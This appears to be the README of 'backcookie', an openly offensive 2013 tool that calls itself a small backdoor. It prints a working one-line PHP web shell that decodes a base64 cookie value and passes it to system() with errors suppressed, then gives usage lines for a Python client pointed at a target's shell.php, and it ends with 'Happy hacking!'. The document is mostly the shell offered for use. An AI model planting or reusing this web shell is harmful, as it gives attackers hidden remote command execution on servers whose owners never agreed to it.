backcookie
==========


Small backdoor using cookie.

==========

```php
<?php error_reporting(0); system(base64_decode($_COOKIE["yourcookie"])); ?>
```

```
Example one: python backcookie.py -u http://target.com/shell.php -c name_cookie
```
```
Example two: python backcookie.py --url http://target.com/shell.php --cookie name_cookie
```
Custom command (binfo), You get objective information
```
@pwned:~$ binfo
```

* Inserted in -> [blackarch](http://blackarch.org/tools.html)

## Happy hacking!

-------------

Copyright, 2013 by [Jose Pino](http://twitter.com/jofpin)

-------------
